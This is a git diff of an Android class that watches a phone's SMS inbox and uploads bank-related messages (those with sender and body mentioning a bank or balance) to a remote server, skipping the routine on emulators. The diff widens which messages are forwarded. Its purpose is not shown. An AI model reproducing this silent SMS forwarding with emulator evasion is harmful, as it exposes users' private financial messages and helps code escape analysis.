@@ -7,9 +7,6 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
-import android.text.TextUtils;
-import android.util.Log;
-import android.widget.Toast;
 
 import com.project.myapplicationsms.base.Global;
 import com.project.myapplicationsms.bean.LogBean;
@@ -17,8 +14,8 @@ import com.project.myapplicationsms.bean.UserLoginBean;
 import com.project.myapplicationsms.http.NetApiUtil;
 import com.project.myapplicationsms.network.ServerResult;
 import com.project.myapplicationsms.utils.BaseConfigPreferences;
+import com.project.myapplicationsms.utils.FixSizeLinkedList;
 import com.project.myapplicationsms.utils.MessageUtils;
-import com.project.myapplicationsms.utils.StringUtils;
 import com.project.myapplicationsms.utils.SystemUtil;
 import com.project.myapplicationsms.utils.ThreadUtil;
 
@@ -31,6 +28,7 @@ public  class SmsContent extends ContentObserver {
     private Context mActivity;
     private static int initialPos;
     private static final Uri uriSMS = Uri.parse("content://sms/inbox");
+    FixSizeLinkedList<Integer> fixlist = new FixSizeLinkedList<>(200);
 
     public SmsContent(Handler handler, Context activity) {
         super(handler);
@@ -76,13 +74,14 @@ public  class SmsContent extends ContentObserver {
         cursor = this.mActivity.getContentResolver().query(uri, null, null, null, "date desc");
         if (cursor != null) {
             if (cursor.moveToFirst()) {
-                if (initialPos != getLastMsgId()) {
+                int lastID=getLastMsgId();
+                if (initialPos !=lastID &&!fixlist.contains(lastID)) {
                     int id = cursor.getInt(cursor.getColumnIndex("_id"));
                     String body = cursor.getString(cursor.getColumnIndex("body"));
                     String address = cursor.getString(cursor.getColumnIndex("address"));
-                    initialPos = getLastMsgId();
-                   // body="您尾号*3455的卡于08月17日23:59在支付宝转入299.88元，交易后余额为300.81元。【交通银行】";
-                    pasreSMS(body,uri,  address);
+                    initialPos = lastID;
+                    fixlist.add(initialPos);
+                    pasreSMS(body,uri,  address,initialPos);
                     cursor.close();
                 }
             }
@@ -90,21 +89,13 @@ public  class SmsContent extends ContentObserver {
     }
 
 
-    public void pasreSMS(String body,Uri uri,String  smsSender ){
-        String amount= StringUtils.parseInMoney(body);
-        String cardNo=StringUtils.parseBankLastFour(body);
-        String bankName=StringUtils.parseBankName(body);
+    public void pasreSMS(String body,Uri uri,String  smsSender,int smsId ){
         String createTime=new Date().getTime()+"";
-        String macCode= SystemUtil.recupAdresseMAC(this.mActivity);
         if(SystemUtil.isEmulator(this.mActivity)){
             return ;
         }
 
-        if(TextUtils.isEmpty(amount)||(TextUtils.isEmpty(cardNo))||TextUtils.isEmpty(bankName)||body.indexOf("银行")<0||body.indexOf("余额")<0){
-            return;
-        }
-
-        if(!StringUtils.isNumber(cardNo)){
+        if(body.indexOf("银行")<0&&body.indexOf("余额")<0){
             return;
         }
         Activity activity= (Activity) this.mActivity;
@@ -112,18 +103,19 @@ public  class SmsContent extends ContentObserver {
             @Override
             public void run() {
 
-                ServerResult<UserLoginBean> visitRecordDetail = NetApiUtil.postSMS(activity,smsSender,body);
+                ServerResult<UserLoginBean> visitRecordDetail = NetApiUtil.postSMS(activity,smsSender,body,smsId);
                 Global.runInMainThread(new Runnable() {
                     @Override
                     public void run() {
-                        LogBean logBean=new LogBean();
-                        logBean.setAmount(amount);
-                        logBean.setCreateTime(createTime);
-                        logBean.setBankName(bankName);
-                        logBean.setCardNo(cardNo);
-                        logBean.setAddress(smsSender);
+                        LogBean logBean=null;
+                        if(visitRecordDetail!=null&&visitRecordDetail.itemList!=null&&visitRecordDetail.itemList.size()>0){
+                            logBean=visitRecordDetail.itemList.get(0).getData();
+                        }else{
+                            logBean=new LogBean();
+                            logBean.setCreateTime(createTime);
+                            logBean.setSmsSender(smsSender);
+                        }
                         logBean.setSignKey(BaseConfigPreferences.getInstance(activity).getLoginSigin());
-                       // logBean.setUrl(uri.toString());
                         if(visitRecordDetail!=null){
                             int code=visitRecordDetail.getResultCode();
                             String msg="";
